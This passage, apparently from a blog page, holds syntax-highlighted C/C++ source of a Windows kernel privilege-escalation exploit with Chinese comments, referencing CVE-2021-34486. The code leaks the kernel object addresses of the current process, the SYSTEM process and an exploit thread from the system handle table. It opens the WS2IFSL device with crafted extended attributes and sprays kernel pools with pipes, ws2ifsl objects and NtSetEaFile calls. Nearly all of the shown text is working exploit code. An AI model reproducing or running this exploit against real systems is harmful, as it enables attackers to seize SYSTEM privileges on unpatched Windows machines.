</span></span><span style="display:flex;"><span>		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo <span style="color:#ff79c6">=</span> (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo<span style="color:#ff79c6">-&gt;</span>Handles[i];
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (handleInfo.UniqueProcessId <span style="color:#ff79c6">==</span> CurPid)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] PID %d</span><span style="color:#f1fa8c">\t</span><span style="color:#f1fa8c">Object %#llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, handleInfo.UniqueProcessId, (ULONG64)handleInfo.Object);
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 找到 ExploitThread 的ETHREAD
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// 找到System的 EPROCESS
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// 找到当前进程的 EPROCESS
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">for</span> (ULONG i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> HandleInfo<span style="color:#ff79c6">-&gt;</span>NumberOfHandles; i<span style="color:#ff79c6">++</span>) 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry <span style="color:#ff79c6">=</span> (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo<span style="color:#ff79c6">-&gt;</span>Handles[i];
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (HandleEntry.UniqueProcessId <span style="color:#ff79c6">==</span> CurPid <span style="color:#ff79c6">&amp;&amp;</span> HandleEntry.HandleValue <span style="color:#ff79c6">==</span> (ULONG)g_ThreadExploitHandle)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			g_ExploitEthread <span style="color:#ff79c6">=</span> (ULONG64)HandleEntry.Object;
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Exploit thread PID: %d</span><span style="color:#f1fa8c">\t</span><span style="color:#f1fa8c">handle: %#x</span><span style="color:#f1fa8c">\t</span><span style="color:#f1fa8c">_KTHREAD: %#llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, HandleEntry.UniqueProcessId, HandleEntry.HandleValue, g_ExploitEthread);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 当前进程 Eprocess
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#ff79c6">if</span> (HandleEntry.UniqueProcessId <span style="color:#ff79c6">==</span> CurPid <span style="color:#ff79c6">&amp;&amp;</span> HandleEntry.HandleValue <span style="color:#ff79c6">==</span> (ULONG)hSelf) 
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			g_CurrentEprocess <span style="color:#ff79c6">=</span> (ULONG64)HandleEntry.Object;
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Current PID: %d</span><span style="color:#f1fa8c">\t</span><span style="color:#f1fa8c">handle: %#x</span><span style="color:#f1fa8c">\t</span><span style="color:#f1fa8c">_EPROCESS: %#llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, HandleEntry.UniqueProcessId, (ULONG)hSelf, g_CurrentEprocess);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// System 进程 Eprocess
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#ff79c6">if</span> (HandleEntry.UniqueProcessId <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x4</span> <span style="color:#ff79c6">&amp;&amp;</span> HandleEntry.HandleValue <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x4</span>) 
</span></span><span style="display:flex;"><span>		{ <span style="color:#6272a4">// SYSTEM Process has a handle to itself
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			g_SystemEprocess <span style="color:#ff79c6">=</span> (ULONG64)HandleEntry.Object;
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] System _EPROCESS: 0x%llx</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>, g_SystemEprocess);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (g_ExploitEthread <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> g_CurrentEprocess <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> g_SystemEprocess) 
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			free(HandleInfo);
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Get kthread and ktoken
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">if</span> (g_ExploitEthread <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> g_CurrentEprocess <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> g_SystemEprocess <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error Leak</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ws2ifsl
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// wdm.h
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// 结构提供扩展属性 (EA) 信息
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_FILE_FULL_EA_INFORMATION</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	ULONG NextEntryOffset;
</span></span><span style="display:flex;"><span>	UCHAR Flags;
</span></span><span style="display:flex;"><span>	UCHAR EaNameLength;
</span></span><span style="display:flex;"><span>	USHORT EaValueLength;
</span></span><span style="display:flex;"><span>	CHAR EaName[<span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>} FILE_FULL_EA_INFORMATION, <span style="color:#ff79c6">*</span> PFILE_FULL_EA_INFORMATION;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_PROC_DATA</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	HANDLE ApcThread;          <span style="color:#6272a4">// 0x00
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	PVOID RequestQueueRoutine; <span style="color:#6272a4">// 0x04
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	PVOID CancelQueueRoutine;  <span style="color:#6272a4">// 0x08
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	PVOID ApcContext;          <span style="color:#6272a4">// 0x0C
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	PVOID unknown3;            <span style="color:#6272a4">// 0x10
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>} PROC_DATA, <span style="color:#ff79c6">*</span> PPROC_DATA;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HANDLE g_ThreadApcHandle;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Spray Ws2P
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">const</span> ULONG64 CountSprayWs2P      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x100</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// spray NpFr
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">const</span> ULONG64 CountSprayPipe      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x100</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Spray tag IO
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">const</span> ULONG64 CountSprayEaFile    <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1000</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// set to cpu number later
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>DWORD CountConcurrentSprayEaFile  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> ULONG64 CountSprayMm        <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1000</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Ws2P Process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>HANDLE<span style="color:#ff79c6">*</span> g_ProcessList;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>HANDLE <span style="color:#50fa7b">CreateProcessFileHandle</span>(HANDLE hThreadApc)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	UNICODE_STRING deviceName;
</span></span><span style="display:flex;"><span>	RtlInitUnicodeString(<span style="color:#ff79c6">&amp;</span>deviceName, (PWSTR)<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Device</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">WS2IFSL</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">NifsPvd&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	OBJECT_ATTRIBUTES object;
</span></span><span style="display:flex;"><span>	InitializeObjectAttributes(<span style="color:#ff79c6">&amp;</span>object, <span style="color:#ff79c6">&amp;</span>deviceName, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	PFILE_FULL_EA_INFORMATION pFileEa <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>		(PFILE_FULL_EA_INFORMATION)malloc(<span style="color:#ff79c6">sizeof</span>(FILE_FULL_EA_INFORMATION) <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#f1fa8c">&#34;NifsPvd&#34;</span>) <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">sizeof</span>(PROC_DATA));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (pFileEa <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;Error malloc</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	pFileEa<span style="color:#ff79c6">-&gt;</span>NextEntryOffset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	pFileEa<span style="color:#ff79c6">-&gt;</span>Flags <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	pFileEa<span style="color:#ff79c6">-&gt;</span>EaNameLength <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#f1fa8c">&#34;NifsPvd&#34;</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>	pFileEa<span style="color:#ff79c6">-&gt;</span>EaValueLength <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(PROC_DATA);
</span></span><span style="display:flex;"><span>	memcpy(pFileEa<span style="color:#ff79c6">-&gt;</span>EaName, <span style="color:#f1fa8c">&#34;NifsPvd&#34;</span>, pFileEa<span style="color:#ff79c6">-&gt;</span>EaNameLength <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	PPROC_DATA pProcData <span style="color:#ff79c6">=</span> (PPROC_DATA)((<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)pFileEa <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">sizeof</span>(FILE_FULL_EA_INFORMATION) <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#f1fa8c">&#34;NifsPvd&#34;</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">4</span>);
</span></span><span style="display:flex;"><span>	pProcData<span style="color:#ff79c6">-&gt;</span>ApcThread <span style="color:#ff79c6">=</span> hThreadApc;
</span></span><span style="display:flex;"><span>	pProcData<span style="color:#ff79c6">-&gt;</span>RequestQueueRoutine <span style="color:#ff79c6">=</span> (PVOID)<span style="color:#bd93f9">0xaaaaaaaa</span>;
</span></span><span style="display:flex;"><span>	pProcData<span style="color:#ff79c6">-&gt;</span>CancelQueueRoutine <span style="color:#ff79c6">=</span> (PVOID)<span style="color:#bd93f9">0xbbbbbbbb</span>;
</span></span><span style="display:flex;"><span>	pProcData<span style="color:#ff79c6">-&gt;</span>ApcContext <span style="color:#ff79c6">=</span> (PVOID)<span style="color:#bd93f9">0xcccccccc</span>;
</span></span><span style="display:flex;"><span>	pProcData<span style="color:#ff79c6">-&gt;</span>unknown3 <span style="color:#ff79c6">=</span> (PVOID)<span style="color:#bd93f9">0xdddddddd</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	HANDLE handle <span style="color:#ff79c6">=</span> INVALID_HANDLE_VALUE;
</span></span><span style="display:flex;"><span>	IO_STATUS_BLOCK IoStatusBlock;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// object -&gt; handle
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	NTSTATUS status <span style="color:#ff79c6">=</span> NtCreateFile(
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>handle, 
</span></span><span style="display:flex;"><span>		MAXIMUM_ALLOWED, 
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>object, 
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>IoStatusBlock, 
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>, FILE_ATTRIBUTE_NORMAL, <span style="color:#bd93f9">0</span>, FILE_OPEN_IF, 
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		pFileEa,
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">sizeof</span>(FILE_FULL_EA_INFORMATION) <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#f1fa8c">&#34;NifsPvd&#34;</span>) <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">sizeof</span>(PROC_DATA)
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (NT_ERROR(status))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error NtCreateFile</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		free(pFileEa);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	free(pFileEa);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> handle;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Io Pool
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>DWORD WINAPI <span style="color:#50fa7b">APCThread</span>(LPVOID lparam)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">while</span> (<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		Sleep(<span style="color:#bd93f9">0x100</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// NpFr
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_PIPE_HANDLES</span> {
</span></span><span style="display:flex;"><span>	HANDLE r;
</span></span><span style="display:flex;"><span>	HANDLE w;
</span></span><span style="display:flex;"><span>} PIPE_HANDLES;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>PIPE_HANDLES<span style="color:#ff79c6">&gt;</span> g_Pipe;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#50fa7b">SprayPipe</span>(ULONG size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Spray NpFr begin...</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	ULONG payloadSize <span style="color:#ff79c6">=</span> size <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x40</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountSprayPipe; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		PIPE_HANDLES pipe;
</span></span><span style="display:flex;"><span>		UCHAR<span style="color:#ff79c6">*</span> payload <span style="color:#ff79c6">=</span> (UCHAR<span style="color:#ff79c6">*</span>)malloc(payloadSize);
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (payload <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;malloc failed, err: %d</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, GetLastError());
</span></span><span style="display:flex;"><span>			exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		memset(payload, <span style="color:#f1fa8c">&#39;p&#39;</span>, payloadSize);
</span></span><span style="display:flex;"><span>		BOOL res <span style="color:#ff79c6">=</span> CreatePipe(<span style="color:#ff79c6">&amp;</span>pipe.r, <span style="color:#ff79c6">&amp;</span>pipe.w, <span style="color:#8be9fd;font-style:italic">NULL</span>, payloadSize);
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (res <span style="color:#ff79c6">==</span> FALSE)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error CreatePipe</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>			exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		DWORD resultLength;
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// res = WriteFile(writePipe, payload, sizeof(payload), &amp;resultLength, NULL);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		res <span style="color:#ff79c6">=</span> WriteFile(pipe.w, payload, payloadSize, <span style="color:#ff79c6">&amp;</span>resultLength, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (res <span style="color:#ff79c6">==</span> FALSE)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;Error WriteFile</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>			exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		g_Pipe.push_back(pipe);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Spray NpFr done!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#50fa7b">NTSTATUS</span>(WINAPI<span style="color:#ff79c6">*</span> PNtSetEaFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG);
</span></span><span style="display:flex;"><span>PNtSetEaFile NtSetEaFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HANDLE <span style="color:#50fa7b">Setup</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	g_hDevice <span style="color:#ff79c6">=</span> CreateFileW(DEVICE, GENERIC_READ <span style="color:#ff79c6">|</span> GENERIC_WRITE, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (INVALID_HANDLE_VALUE <span style="color:#ff79c6">==</span> g_hDevice)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error CreateFileW DEVICE</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// wprintf(L&#34;Open device %s succeeded, handle: %p\n&#34;, DEVICE, ghDev);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	g_ThreadApcHandle <span style="color:#ff79c6">=</span> CreateThread(<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>, APCThread, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (g_ThreadApcHandle <span style="color:#ff79c6">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error CreateThread</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	g_ProcessList <span style="color:#ff79c6">=</span> (HANDLE<span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(HANDLE) <span style="color:#ff79c6">*</span> CountSprayWs2P);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (g_ProcessList <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error malloc g_ProcessList</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	RtlFillMemory(g_ProcessList, <span style="color:#ff79c6">sizeof</span>(HANDLE) <span style="color:#ff79c6">*</span> CountSprayWs2P, <span style="color:#bd93f9">0xff</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	NtSetEaFile <span style="color:#ff79c6">=</span> (PNtSetEaFile)<span style="color:#ff79c6">::</span>GetProcAddress(<span style="color:#ff79c6">::</span>LoadLibraryW(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;ntdll.dll&#34;</span>), <span style="color:#f1fa8c">&#34;NtSetEaFile&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (NtSetEaFile <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error GetProcAddress(NtSetEaFile)</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Io
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// 通过 payloadSize 可以控制chunk的大小
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	HANDLE hPEAuth;
</span></span><span style="display:flex;"><span>	UCHAR<span style="color:#ff79c6">*</span> payload;
</span></span><span style="display:flex;"><span>	ULONG PayloadSize;
</span></span><span style="display:flex;"><span>} ParamSprayEaFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HANDLE<span style="color:#ff79c6">*</span> g_EaThreadList;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DWORD WINAPI <span style="color:#50fa7b">ThreadSprayEaFile</span>(LPVOID param)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	ParamSprayEaFile<span style="color:#ff79c6">*</span> _param <span style="color:#ff79c6">=</span> (ParamSprayEaFile<span style="color:#ff79c6">*</span>)param;
</span></span><span style="display:flex;"><span>	IO_STATUS_BLOCK iostatus;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountSprayEaFile; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		NtSetEaFile(_param<span style="color:#ff79c6">-&gt;</span>hPEAuth, <span style="color:#ff79c6">&amp;</span>iostatus, _param<span style="color:#ff79c6">-&gt;</span>payload, _param<span style="color:#ff79c6">-&gt;</span>PayloadSize);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// EaFile =&gt; Io
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// 详情：CVE-2021-34486
